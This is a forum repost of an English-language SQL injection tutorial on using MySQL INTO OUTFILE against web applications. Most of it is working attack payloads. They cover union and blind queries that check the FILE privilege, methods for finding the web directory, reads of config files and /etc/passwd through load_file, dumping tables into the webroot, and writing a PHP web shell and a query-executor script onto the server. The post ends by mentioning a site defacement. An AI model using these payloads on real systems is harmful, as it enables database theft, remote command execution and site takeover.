@@ -1,0 +1,174 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+INTO OUTFILE (Mysql) paper
+D8888D主贴内容-------------------------------------------------------
+o00000000000000000000000000000000000000000000000000000o [!] Paper about:
+8                            .o8                      8     INTO OUTFILE (Mysql)
+8                           "888                      8 [!] Athor: xados  
+8 oooo    ooo  .oooo.    .oooo888   .ooooo.   .oooo.o 8 [!] Contact:
+8  `88b..8P'  `P  )88b  d88' `888  d88' `88b d88(  "8 8     [url=http://www.t00ls.net/mailto:xados@hotmail.it]链接标记xados@hotmail.it[/url]
+8    Y888'     .oP"888  888   888  888   888 `"Y88b.  8 [!] Thnaks to:
+8  .o8"'88b   d8(  888  888   888  888   888 o.  )88b 8     Johannes Dahse      
+8 o88'   888o `Y888""8o `Y8bod88P" `Y8bod8P' 8""888P' 8     becouse this  
+8                                                     8     paper is from
+8                                                     8     his mind.
+o00000000000000000000000000000000000000000000000000000o        ~  ~  ~
+
+[+1] The FILE privilege
+
+If we want to read or write to files we have to have the FILE privilege.
+First see wich user we are in db with code:
+
+0′ UNION SELECT current_user,null /*
+
+you can put current_user or user() or system_user
+
+This will give us the username@server. //(normally ..@localhost)
+
+*
+You can also use the following blind SQL injections query,
+but it's very booring.. :
+
+Guess a name:
+1′ AND user() LIKE ‘root
+Brute the name letter by letter:
+1′ AND MID((user()),1,1)>’m
+1′ AND MID((user()),2,1)>’m
+1′ AND MID((user()),3,1)>’m ecc...
+
+Now we must acces to mysql.user so..
+
+0′ UNION SELECT 1,2,3,file_priv,4 FROM mysql.user WHERE user = ‘username
+
+for username we put the name of current_user.
+You can also have a look at the whole mysql.user table without the WHERE clause, but I chose this way because you can easily adapt the injection for blind SQL injection:
+
+1′ AND MID((SELECT file_priv FROM mysql.user WHERE user = ‘username’),1,1) = ‘Y
+
+Naturally, this it's a blind so yuo can't write 1,2,3.. becouse it's not a union select. (but it's subselects )
+
+You can also recieve the FILE privilege info from the information.schema table on MySQL 5:
+
+0′ UNION SELECT grantee,is_grantable FROM information_schema.user_privileges WHERE privilege_type = ‘file’ AND grantee like ‘%username%
+
+Like IN blind sqli:
+
+1′ AND MID((SELECT is_grantable FROM information_schema.user_privileges WHERE privilege_type = ‘file’ AND grantee like ‘%username%’),1,1)=’Y
+
+
+[+2] The web directory problem
+
+Once we know if we can read/write files we have to check out the right path. In the most cases the MySQL server is running on the same machine as the webserver does and to access our files later we want to write them onto the web directory. If you define no path, INTO OUTFILE will write into the database directory.
+
+On MySQL 4 we can get an error message displaying the datadir:
+0′ UNION SELECT load_file(’a'),null/*
+
+On MySQL 5 we use:
+0′ UNION SELECT @@datadir,null/*
+
+The default path for file writing then is datadir\databasename.
+You can figure out the databasename with:
+0′ UNION SELECT database(),null/*
+
+Now these information are hard to get with blind SQL injection. But you don’t need them necessarily. Just make sure you find out the web directory and use some ../ to jump back from the datadir.
+
+If you are lucky the script uses mysql_result(), mysql_free_result(), mysql_fetch_row() or similar functions and displays warning messages. Then you can easily find out the webserver directory by leaving those functions with no input that they will throw a warning message like:
+
+Warning: mysql_fetch_row(): supplied argument is not a valid MySQL result resource in /web/server/path/file.php on line xxx
+
+To provoke an error like this try something like:
+0′ AND 1=’0 or add some like param[]=1
+
+This works at the most websites. If you’re not lucky you have to guess the web directory or try to use load_file() to fetch files on the server which might help you. Here is a new list of possible locations for the Apache configuration file, which may spoil the webdirectory path:
+
+/etc/init.d/apache
+/etc/init.d/apache2
+/etc/httpd/httpd.conf
+/etc/apache/apache.conf
+/etc/apache/httpd.conf
+/etc/apache2/apache2.conf
+/etc/apache2/httpd.conf
+/usr/local/apache2/conf/httpd.conf
+/usr/local/apache/conf/httpd.conf
+/opt/apache/conf/httpd.conf
+/home/apache/httpd.conf
+/home/apache/conf/httpd.conf
+/etc/apache2/sites-available/default
+/etc/apache2/vhosts.d/default_vhost.include
+
+Check out the webservers name first by reading the header info and then figure out where it usually stores its configuration files. This also depends on the OS type (*nix/win) so you may want to check that out too. Use @@version or version() to find that out:
+0′ UNION SELECT @@version,null /*
+-nt-log at the end means it’s a windows box, -log only means it’s *nix box.
+Or take a look at the paths in error messages or at the header.
+
+Typical web directories to guess could be:
+
+/var/www/root/
+/var/www/dbname/path/
+/var/www/sitename/htdocs/
+/var/www/localhost/htdocs
+..
+
+
+Basically you should be allowed to write into any directory where the MySQL server has write access to, as long as you have the FILE privilege. However, an Administrator can limit the path for public write access.
+
+[+3] create useful files
+
+Once you figured out the right directory you can select data and write it into a file with:
+
+0′ UNION SELECT columnname,null FROM tablename INTO OUTFILE ‘../../web/path/file.txt
+
+( sometimes from mysql.user )
+Or the whole data without knowing the table/column names:
+
+1′ OR 1=1 INTO OUTFILE ‘../../web/path/file.txt
+
+If you want to avoid splitting chars between the data, use INTO DUMPFILE instead of INTO OUTFILE.
+
+You can also combine load_file() with into outfile, like putting a copy of a file to the accessable webspace:
+
+0′ AND 1=0 UNION SELECT load_file(’…’) INTO OUTFILE ‘…
+
+In some cases I’d recommend to use
+
+0′ AND 1=0 UNION SELECT hex(load_file(’…’)) INTO OUTFILE ‘…
+
+and decrypt it later with the PHP Charset Encoder, especially when reading the MySQL data files.
+
+Or you can write whatever you want into a file:
+
+0′ AND 1=0 UNION SELECT ‘code’,null INTO OUTFILE ‘../../web/server/dir/file.php
+
+Here are some useful code examples:
+
+A Normal code for a shell (PHP):
+
+<? system($_GET['lol']); ?>
+
+it's very important that the PHP safe_mode must be turned off!!. 
+If is turned on maybe we can bypass symple with a hex converter:
+
+we can convert the code for bypass MAGIC_QUOTES_GPC filter.
+(normally yuo cans ee if hex_mode work with a load_file(pathinhex),
+like load_file(0x2f6574632f706173737764) for /etc/password (<= usually path)
+
+
+we can see a lot of informations about the webserver configuration with:
+
+<? phpinfo(); ?>
+
+// SQL QUERY
+<? ... $result = mysql_query($_GET['query']); ... ?>
+Try to use load_file() to get the database connection credentials, or try to include an existing file on the webserver which handles the mysql connect.
+
+REmember that the quotes are required and so if the error are like:
+
+error db near '\/www/root/path/page.php'\
+maybe it's becouse the quotes are not allowed (with special filter used for anti-xss)
+
+So at the end: try and try and try. iT's 3.47 of night.. @.@ , now a marocco's hackers deface r00t.h4cky0u.org uff... this fuking priv8 exploit in bad hands :)
+so good night.
+
+
+ByEzzz xaDoS
